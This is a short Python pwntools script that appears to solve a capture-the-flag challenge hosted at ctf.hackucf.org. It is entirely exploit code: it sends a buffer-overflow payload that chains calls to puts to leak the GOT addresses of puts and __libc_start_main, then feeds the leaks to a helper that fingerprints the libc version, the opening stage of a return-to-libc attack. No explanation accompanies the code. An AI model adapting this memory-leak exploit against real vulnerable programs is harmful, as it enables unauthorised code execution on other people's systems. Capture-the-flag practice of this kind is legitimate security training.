from pwn import *

import TheNight

import sys

target = remote("ctf.hackucf.org", 32101)
payload = ""
payload += "00000000000000000000000000000000000000000000000000"
payload += "000000000000"
payload += p32(0x8048560)
payload += p32(0x8048560)
payload += p32(0x8049bc0)
payload += p32(0x8049bc4)
target.sendline(payload)
target.recvline()
target.recvline()
leak = target.recv(4)
gotAddress0 = u32(leak)
target.recvline()
leak = target.recv(4)
gotAddress1 = u32(leak)
symbol0 = "puts"
symbol1 = "__libc_start_main"
TheNight.findLibcVersionAutomated("puts", gotAddress0, "__libc_start_main", gotAddress1)
